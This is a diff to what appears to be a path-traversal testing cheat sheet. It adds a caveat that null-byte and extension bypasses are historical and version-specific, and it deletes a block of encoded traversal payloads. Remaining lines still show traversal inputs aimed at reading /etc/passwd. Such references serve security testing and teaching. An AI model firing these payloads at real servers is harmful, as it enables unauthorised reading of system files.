@@ -164,6 +164,8 @@ C:\boot.ini
 
 #### Bypass Extension Validation
 
+Historical/parser-specific examples only: extra extensions do not by themselves make an existing file readable, and modern runtimes reject null-byte/invalid encoding tricks. Validate against the exact version; do not claim a bypass from a payload string alone.
+
 ```bash
 # Null byte injection (older PHP versions)
 ../../../etc/passwd%00.jpg
@@ -189,21 +191,4 @@ images/../../../etc/passwd
 #### Bypass Blacklist Filters
 
 ```bash
-# Unicode/UTF-8 encoding
-..%c0%af..%c0%af..%c0%afetc/passwd
-..%c1%9c..%c1%9c..%c1%9cetc/passwd
-
-# Overlong UTF-8 encoding
-%c0%2e%c0%2e%c0%af
-
-# URL encoding variations
-%2e%2e/
-%2e%2e%5c
-..%5c
-..%255c
-
-# Case variations (Windows)
-....\\....\\etc\\passwd
-```
-
-### Phase 5: Linux Targe
+# Unicode/UTF-8 enco
